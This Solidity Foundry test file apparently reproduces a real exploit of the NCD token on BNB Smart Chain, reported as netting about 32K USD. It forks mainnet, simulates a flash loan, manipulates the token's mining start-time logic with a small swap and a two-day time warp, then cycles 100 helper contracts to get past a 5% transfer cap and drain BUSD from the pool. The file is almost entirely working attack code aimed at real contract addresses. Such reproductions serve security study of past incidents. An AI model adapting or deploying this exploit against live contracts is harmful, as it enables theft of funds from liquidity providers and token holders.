// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~32K USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb
// GUY : https://twitter.com/PeckShieldAlert/status/1788153869987611113
// Vuln Contract: https://bscscan.com/address/0xf51cbf9f8e089ca48e454eb79731037a405972ce

interface INcd is IERC20{
    function mineStartTime(address) view external returns(uint256);
}
contract NCDExploit is Test {
    INcd  ncd_ = INcd(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IUniswapV2Pair  ncd_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
    IERC20 busd_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Router router_ = IUniswapV2Router(payable(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)));

    function setUp() external {
        vm.createSelectFork("bsc", 39251894);
        ncd_.approve(address(router_), type(uint256).max);
        busd_.approve(address(router_), type(uint256).max);
        
    }

    function testExploit() public {
        console.log("time =", ncd_.mineStartTime(address(this)));        
        {
            (uint256 amount0, uint256 amount1, ) = ncd_pair_.getReserves();
            emit log_named_decimal_uint("amount0 = ", amount0, 18);
            emit log_named_decimal_uint("amount0 = ", amount1, 18);
        }
        deal(address(busd_), address(this), 20000 ether); // simulate flashLoan
        address[] memory path = new address[](2);
        path[0] = address(busd_);
        path[1] = address(ncd_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            10,
            0,
            path,
            address(this),
            block.timestamp
        );
        console.log("time =", ncd_.mineStartTime(address(this)));        

        vm.warp(block.timestamp + 86400 * 2); // 2 day
        path[0] = address(busd_);
        path[1] = address(ncd_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busd_.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        for(uint256 i = 0; i < 100; i++){
            NCDExploit2 exploit2 = new NCDExploit2();
            ncd_.transfer(address(exploit2), ncd_.balanceOf(address(this)));
            exploit2.withdraw();
        }

        emit log_named_decimal_uint("profit = ", busd_.balanceOf(address(this)), 18);
    }
}

// this contract is used to withdraw profit, beacuse only 5% can be transfer each time
contract NCDExploit2 is Test {
    INcd  ncd_ = INcd(0x9601313572eCd84B6B42DBC3e47bc54f8177558E);
    IUniswapV2Pair  ncd_pair_ = IUniswapV2Pair(0x94Bb269518Ad17F1C10C85E600BDE481d4999bfF);
    IERC20 busd_ = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Router router_ = IUniswapV2Router(payable(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)));
    constructor(){
        ncd_.approve(address(router_), type(uint256).max);
        busd_.approve(address(router_), type(uint256).max);
    }
    function withdraw() public{
        address[] memory path = new address[](2);
        path[0] = address(ncd_);
        path[1] = address(busd_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ncd_.balanceOf(address(this)) * 5/100,
            0,
            path,
            address(this),
            block.timestamp
        );
        ncd_.transfer(address(msg.sender), ncd_.balanceOf(address(this)));
        busd_.transfer(address(msg.sender), busd_.balanceOf(address(this)));
    
    }
}



